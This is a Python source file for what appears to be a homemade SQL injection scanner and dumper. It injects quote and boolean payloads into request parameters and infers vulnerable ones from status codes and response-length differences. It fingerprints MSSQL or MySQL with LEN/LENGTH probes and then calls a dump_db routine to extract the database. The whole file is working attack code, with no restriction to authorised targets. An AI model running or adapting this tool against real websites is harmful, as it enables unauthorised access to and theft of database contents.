import requests
from urllib.parse import urlencode
from engines import ENGINES
from core import dump_db, send
from collections import namedtuple

def ecart(a, b):
    x = abs(a-b) / b * 100
    return x

def get_engine(url, value, name, params):
        copy= params.copy()
        copy[name] = value + " AND LEN('a')=1"
        copy_mysql = params.copy()
        copy_mysql[name] = value + " AND LENGTH('a')=1"
        is_mssql = send(url, copy, "GET")
        is_mysql = send(url, copy_mysql, "GET")
        r = send(url, params, "GET")
        if(is_mssql.status_code == 200 and ecart(len(is_mssql.text), len(r.text)) < 10 ) :
            return ENGINES["mssql"]
        elif(is_mysql.status_code == 200 and ecart(len(is_mysql.text), len(r.text)) < 10 ) :
            return ENGINES["mysql"]
        else :
            return

        
def inject_apostrophe(name,value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value+ "'"
    r = send(parsed_url, params, method)
    copy_r = send(parsed_url, copy, method)
    if(r.status_code == 200 and copy_r.status_code == 500):
        print("website vulnerable on this param :", name)
        engine = get_engine(parsed_url, value, name, params)
        print("engine ok")
        Ctx = namedtuple("Ctx", ["url", "params", "name", "method"])
        ctx = Ctx(parsed_url, params, name, method)
        data = dump_db(ctx, engine)
        return data
    return

def inject_bool(name,value, params, parsed_url, method):
    copy = params.copy()
    copy[name] = value+ ' AND 1=1'
    fail_copy = params.copy()
    fail_copy[name] = value+ ' AND 1=2'
    query = urlencode(copy, doseq=True)
    fail_query = urlencode(fail_copy, doseq=True)
    fail_injection = parsed_url._replace(query=fail_query)
    injection = parsed_url._replace(query=query)
    r = requests.get(parsed_url.geturl())
    copy_r = requests.get(injection.geturl())
    fail_r =  requests.get(fail_injection.geturl())
    if(ecart(len(copy_r.text), len(r.text)) < 10 and ecart(len(fail_r.text), len(copy_r.text)) > 30):
        print("webiste vulnerable on this param :", name)
